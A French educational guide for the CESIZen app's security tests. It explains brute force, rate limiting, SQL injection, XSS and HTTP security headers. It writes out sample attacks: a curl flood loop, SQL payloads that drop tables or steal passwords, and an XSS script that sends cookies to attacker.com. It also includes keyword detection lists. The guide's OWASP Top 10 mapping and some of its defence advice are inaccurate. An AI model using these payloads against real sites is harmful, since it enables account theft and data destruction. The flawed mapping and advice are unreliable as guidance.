# 🛡️ Guide Pédagogique - Sécurité Web

## 🎯 Objectif de ce Guide

Ce document explique les concepts de cybersécurité testés dans notre application CESIZen. Il est conçu pour vous aider à comprendre :
- **Quelles sont les menaces** courantes sur le web
- **Comment les attaquants** procèdent 
- **Comment se défendre** efficacement
- **Comment tester** vos défenses

---

## 🥊 Attaque par Force Brute (Brute Force)

### 🎭 Le Scénario d'Attaque

Imaginez un cambrioleur qui essaie toutes les clés d'un trousseau pour ouvrir une porte. C'est exactement ce que fait une attaque par force brute : elle essaie automatiquement des milliers de combinaisons de mots de passe jusqu'à trouver la bonne.

**Exemple concret :**
```
Tentative 1: admin / password
Tentative 2: admin / 123456  
Tentative 3: admin / admin
Tentative 4: admin / qwerty
... (continue jusqu'à réussir)
```

### 🚨 Pourquoi c'est Dangereux

- **Accès non autorisé** : L'attaquant peut prendre le contrôle de comptes utilisateur
- **Vol de données** : Accès aux informations personnelles et sensibles
- **Déni de service** : Le serveur peut être surchargé par les tentatives
- **Automatisation** : Les outils modernes peuvent tester des millions de combinaisons

### 🛡️ Comment se Défendre

1. **Limitation des tentatives** : Bloquer après X échecs
   ```javascript
   if (failedAttempts >= 5) {
       return "Compte bloqué pendant 15 minutes";
   }
   ```

2. **Délai progressif** : Augmenter l'attente après chaque échec
   ```javascript
   const delay = Math.pow(2, failedAttempts) * 1000; // 1s, 2s, 4s, 8s...
   ```

3. **CAPTCHA** : Ajouter une vérification humaine
4. **Mots de passe forts** : Imposer des critères de complexité
5. **Authentification à deux facteurs (2FA)**

### 🧪 Notre Test

Notre script simule 7 tentatives de connexion rapides avec des données malveillantes. Si l'application nous bloque (erreur 429), c'est que la protection fonctionne !

---

## 🚦 Limitation de Débit (Rate Limiting)

### 🎭 Le Scénario d'Attaque

Un attaquant lance des milliers de requêtes en même temps pour :
- **Surcharger le serveur** (attaque DoS - Denial of Service)
- **Épuiser les ressources** (bande passante, CPU, mémoire)
- **Rendre l'application indisponible** pour les vrais utilisateurs

**Exemple concret :**
```bash
# Script d'attaque simple
for i in {1..10000}; do
    curl http://example.com/api/data &
done
```

### 🚨 Pourquoi c'est Dangereux

- **Interruption de service** : L'application devient inutilisable
- **Coûts supplémentaires** : Surcharge des serveurs et de la bande passante
- **Mauvaise expérience utilisateur** : Lenteur et timeouts
- **Attaques distribuées (DDoS)** : Amplification avec plusieurs sources

### 🛡️ Comment se Défendre

1. **Limites par IP** : Maximum X requêtes par minute par adresse IP
   ```javascript
   const limit = 100; // 100 requêtes par minute max
   const window = 60000; // Fenêtre de 1 minute
   ```

2. **Limites par utilisateur** : Quotas personnalisés selon le rôle
3. **Algorithmes adaptatifs** : Token bucket, sliding window
4. **CDN et cache** : Réduire la charge sur le serveur principal
5. **Blacklisting automatique** : Bloquer les IPs abusives

### 🧪 Notre Test

Nous envoyons 50 requêtes simultanées. Si certaines sont bloquées (429 - Too Many Requests), le rate limiting fonctionne !

---

## 💉 Injection SQL

### 🎭 Le Scénario d'Attaque

L'injection SQL consiste à "glisser" du code SQL malveillant dans les champs de saisie d'une application. C'est comme chuchoter des instructions malveillantes à la base de données.

**Exemple concret :**
```sql
-- Champ de connexion normal
SELECT * FROM users WHERE email = 'user@example.com' AND password = 'motdepasse';

-- Avec injection malveillante dans le champ email
SELECT * FROM users WHERE email = 'admin' OR '1'='1' --' AND password = 'nimporte';
-- Résultat : '1'='1' est toujours vrai, donc on récupère TOUS les utilisateurs !
```

### 🚨 Pourquoi c'est Dangereux

- **Vol de données** : Accès à toute la base de données
- **Destruction** : Suppression de tables entières
- **Modification** : Altération des données (ex: changer des prix)
- **Élévation de privilèges** : Se donner des droits administrateur

**Exemples d'attaques :**
```sql
'; DROP TABLE users; --        # Supprime la table des utilisateurs
' UNION SELECT password FROM admin --  # Vol des mots de passe admin
' OR 1=1 --                    # Contournement d'authentification
```

### 🛡️ Comment se Défendre

1. **Requêtes préparées** (prepared statements)
   ```javascript
   // ❌ Vulnérable
   const query = `SELECT * FROM users WHERE email = '${userInput}'`;
   
   // ✅ Sécurisé
   const query = 'SELECT * FROM users WHERE email = ?';
   db.query(query, [userInput]);
   ```

2. **Validation stricte** des entrées
   ```javascript
   function validateEmail(email) {
       const sqlKeywords = ['SELECT', 'DROP', 'UNION', 'INSERT'];
       return !sqlKeywords.some(keyword => 
           email.toUpperCase().includes(keyword)
       );
   }
   ```

3. **Échappement des caractères** spéciaux
4. **Principe du moindre privilège** : Comptes DB avec droits limités
5. **ORM** (Object-Relational Mapping) qui gère automatiquement la sécurité

### 🧪 Notre Test

Nous envoyons des payloads SQL malveillants dans les paramètres URL. Si l'application renvoie une erreur 400 (Bad Request), elle détecte l'attaque !

---

## 🛡️ Cross-Site Scripting (XSS)

### 🎭 Le Scénario d'Attaque

XSS consiste à injecter du code JavaScript malveillant dans une page web. C'est comme cacher un piège dans un commentaire qui s'active quand quelqu'un d'autre lit ce commentaire.

**Exemple concret :**
```html
<!-- Commentaire normal -->
<p>Merci pour ce super article !</p>

<!-- Commentaire avec XSS -->
<p><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script></p>
```

### 🚨 Pourquoi c'est Dangereux

- **Vol de session** : Récupération des cookies d'authentification
- **Phishing** : Redirection vers de faux sites
- **Keylogging** : Enregistrement des frappes clavier
- **Défiguration** : Modification du contenu de la page
- **Propagation** : Le script malveillant se propage à tous les visiteurs

**Types d'attaques XSS :**
```javascript
// XSS Réfléchi (dans l'URL)
http://example.com/search?q=<script>alert('XSS')</script>

// XSS Stocké (dans la base de données)
Commentaire: <img src=x onerror=alert('XSS')>

// XSS DOM (côté client)
document.getElementById('content').innerHTML = userInput;
```

### 🛡️ Comment se Défendre

1. **Échappement HTML** de tous les contenus utilisateur
   ```javascript
   function escapeHtml(text) {
       return text
           .replace(/&/g, '&amp;')
           .replace(/</g, '&lt;')
           .replace(/>/g, '&gt;')
           .replace(/"/g, '&quot;')
           .replace(/'/g, '&#x27;');
   }
   ```

2. **Validation stricte** des entrées
   ```javascript
   function containsScript(input) {
       const dangerous = /<script|javascript:|on\w+=/i;
       return dangerous.test(input);
   }
   ```

3. **Content Security Policy (CSP)**
   ```http
   Content-Security-Policy: script-src 'self'; object-src 'none';
   ```

4. **Utilisation de frameworks** qui échappent automatiquement
5. **Sanitization** des contenus HTML

### 🧪 Notre Test

Nous envoyons des scripts JavaScript malveillants dans les champs de saisie. Si l'application renvoie 400, elle détecte l'attaque !

---

## 🔒 Headers de Sécurité HTTP

### 🎭 Le Problème

Par défaut, les navigateurs font confiance au contenu qu'ils reçoivent. Les headers de sécurité leur donnent des instructions pour se comporter de manière plus sûre.

### 🛡️ Headers Importants

#### 🖼️ X-Frame-Options
**Protection contre :** Clickjacking (piéger les clics)
```http
X-Frame-Options: DENY
```
Empêche l'intégration de votre site dans une iframe malveillante.

#### 🎭 X-Content-Type-Options  
**Protection contre :** MIME sniffing attacks
```http
X-Content-Type-Options: nosniff
```
Force le navigateur à respecter le type de fichier déclaré.

#### ⚔️ X-XSS-Protection
**Protection contre :** Attaques XSS réfléchies
```http
X-XSS-Protection: 1; mode=block
```
Active le filtre XSS intégré du navigateur.

#### 🔐 Strict-Transport-Security (HSTS)
**Protection contre :** Attaques man-in-the-middle
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
Force l'utilisation de HTTPS.

#### 📋 Content-Security-Policy (CSP)
**Protection contre :** XSS, injection de contenu
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```
Contrôle finement les ressources que la page peut charger.

### 🧪 Notre Test

Nous vérifions la présence des headers essentiels dans les réponses du serveur. Plus il y en a, mieux c'est protégé !

---

## 🎯 Conformité OWASP Top 10

Notre suite de tests couvre plusieurs vulnérabilités du **OWASP Top 10 2021** :

1. **A01 - Broken Access Control** → Tests de brute force
2. **A03 - Injection** → Tests d'injection SQL  
3. **A05 - Security Misconfiguration** → Tests des headers de sécurité
4. **A07 - Cross-Site Scripting (XSS)** → Tests de protection XSS
5. **A10 - Security Logging Failures** → Logs de sécurité

---

## 🚀 Lancer les Tests

### Tests Automatisés
```bash
npm run security-test
```

### Tests Manuels
```bash
# Windows PowerShell
./security/security-test.ps1

# Linux/Mac
./security/manual-security-tests.sh
```

---

## 📚 Ressources Supplémentaires

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **Guide Sécurité Web** : https://web.dev/security/
- **CSP Generator** : https://report-uri.com/home/generate
- **Security Headers Check** : https://securityheaders.com/

---

## 🎓 Points Clés à Retenir

1. **Sécurité par couches** : Plusieurs défenses valent mieux qu'une seule
2. **Validation côté serveur** : Ne jamais faire confiance aux données client
3. **Principe du moindre privilège** : Donner le minimum de droits nécessaires
4. **Tests réguliers** : La sécurité nécessite une vigilance constante
5. **Formation continue** : Les menaces évoluent, nos connaissances aussi

---

*💡 Ce guide accompagne les tests automatisés de sécurité de CESIZen. Pour des questions spécifiques, consultez la documentation des outils de sécurité ou contactez l'équipe de développement.*
